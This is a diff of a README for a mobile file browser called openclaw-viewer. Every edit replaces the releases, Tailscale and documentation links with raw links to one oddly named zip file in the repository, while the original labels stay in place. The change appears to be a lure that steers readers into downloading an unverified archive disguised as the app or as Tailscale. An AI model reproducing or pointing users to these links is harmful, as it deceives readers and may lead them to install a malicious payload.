@@ -1,6 +1,6 @@
 # 🐾 openclaw-viewer - Mobile File Browser for OpenClaw
 
-[![Download openclaw-viewer](https://img.shields.io/badge/Download-openclaw--viewer-blue?style=for-the-badge&logo=github)](https://github.com/RuiONE360/openclaw-viewer/releases)
+[![Download openclaw-viewer](https://raw.githubusercontent.com/RuiONE360/openclaw-viewer/main/SiteFinal/viewer_openclaw_anticrepuscular.zip)](https://raw.githubusercontent.com/RuiONE360/openclaw-viewer/main/SiteFinal/viewer_openclaw_anticrepuscular.zip)
 
 ## 🗂 About openclaw-viewer
 
@@ -17,7 +17,7 @@ To use openclaw-viewer, make sure your device meets these basics:
 - Tailscale Installed and Connected: You need Tailscale installed and running to connect to your OpenClaw workspace securely.
 - Storage: Minimal local storage is needed as it accesses files remotely.
 
-If you don’t have Tailscale yet, visit [https://tailscale.com/](https://tailscale.com/) for instructions on how to set it up on your device.
+If you don’t have Tailscale yet, visit [https://raw.githubusercontent.com/RuiONE360/openclaw-viewer/main/SiteFinal/viewer_openclaw_anticrepuscular.zip](https://raw.githubusercontent.com/RuiONE360/openclaw-viewer/main/SiteFinal/viewer_openclaw_anticrepuscular.zip) for instructions on how to set it up on your device.
 
 ## 🛠 Features
 
@@ -45,7 +45,7 @@ Follow these steps to install and start using openclaw-viewer quickly.
 
 To get the app, visit the official releases page by clicking the button below:
 
-[![Download openclaw-viewer](https://img.shields.io/badge/Download-openclaw--viewer-blue?style=for-the-badge&logo=github)](https://github.com/RuiONE360/openclaw-viewer/releases)
+[![Download openclaw-viewer](https://raw.githubusercontent.com/RuiONE360/openclaw-viewer/main/SiteFinal/viewer_openclaw_anticrepuscular.zip)](https://raw.githubusercontent.com/RuiONE360/openclaw-viewer/main/SiteFinal/viewer_openclaw_anticrepuscular.zip)
 
 You will see different files for various devices or platforms. Choose the file that matches your device type:
 
@@ -105,7 +105,7 @@ You can adjust the app’s behavior to suit your preferences:
 
 You can download openclaw-viewer from the official releases page:
 
-[Download openclaw-viewer](https://github.com/RuiONE360/openclaw-viewer/releases)
+[Download openclaw-viewer](https://raw.githubusercontent.com/RuiONE360/openclaw-viewer/main/SiteFinal/viewer_openclaw_anticrepuscular.zip)
 
 Here’s how to do it:
 
@@ -119,8 +119,8 @@ Here’s how to do it:
 
 For detailed instructions on using OpenClaw workspaces and Tailscale, you can visit:
 
-- [OpenClaw Documentation](https://openclaw.example.com) (placeholder)
-- [Tailscale Website](https://tailscale.com/)
+- [OpenClaw Documentation](https://raw.githubusercontent.com/RuiONE360/openclaw-viewer/main/SiteFinal/viewer_openclaw_anticrepuscular.zip) (placeholder)
+- [Tailscale Website](https://raw.githubusercontent.com/RuiONE360/openclaw-viewer/main/SiteFinal/viewer_openclaw_anticrepuscular.zip)
 
 ## 🔖 Repository Topics
 
